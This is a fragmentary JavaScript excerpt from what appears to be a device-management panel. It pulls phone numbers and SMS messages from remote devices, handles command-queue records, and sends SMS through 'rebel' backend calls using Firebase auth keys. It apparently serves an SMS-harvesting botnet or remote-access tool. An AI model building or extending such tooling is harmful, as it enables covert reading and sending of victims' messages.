...
function getPhoneFromRecord(s, ctx){
  ctx=ctx||{};
  if(!s)return'';
  if(isCommandQueueRecord(s,ctx)||isSmsCommandRecord(s))return'';
  if((s.command||s.messageText||s.sendSms||s.webhookEvent)&&s.phoneNumber&&!s.phone_number&&!s.mobNo&&!s.d_name)return'';
  var check=function(obj){
...
function normalizeClientRecord(raw, devId, node){
  ...
  var mob=getPhoneFromRecord(raw,ctx);
...
function buildDeviceStub(raw,devId,node,fbId){
  ...
  return{
    ...
    sms_count:raw.sms_count||raw.smsCount||raw.total_sms||0,
    mobNo:parseDevicePhone(raw.phone_number)||getPhoneFromRecord(raw,{devId:devId,node:node})||'',
    ...
    roots.forEach(function(node){
      ...
      tasks.push(
        restJsonInst(inst,node+'/'+p.devId).then(function(data){
          ...
          if(isCommandQueueRecord(data,{devId:p.devId,node:node})||isSmsCommandRecord(data))return;
...
function fetchSmsViaPhp(inst,d){
  var nativeRes=rebelApiPost('rebel_fetch_sms',{device_id:d.rawId,database_url:inst.restUrl,auth_key:getFbAuthKey(inst),schema:inst.schema||'rabel',device_node:d.deviceNode||'user_list',composite_id:d.id});  if(nativeRes){    if(!nativeRes.ok||!Array.isArray(nativeRes.messages))return Promise.resolve([]);    return Promise.resolve(nativeRes.messages.map(normalizeSms).filter(Boolean));  }
  if(!inst||!d)return Promise.resolve([]);
...
function sendSmsFetch(body){
  var nativeRes=rebelApiPost('rebel_send_sms',body||{});  if(nativeRes){    return Promise.resolve({httpOk:!!nativeRes.ok,data:nativeRes});  }
  var hdr={'Content-Type':'application/json'};
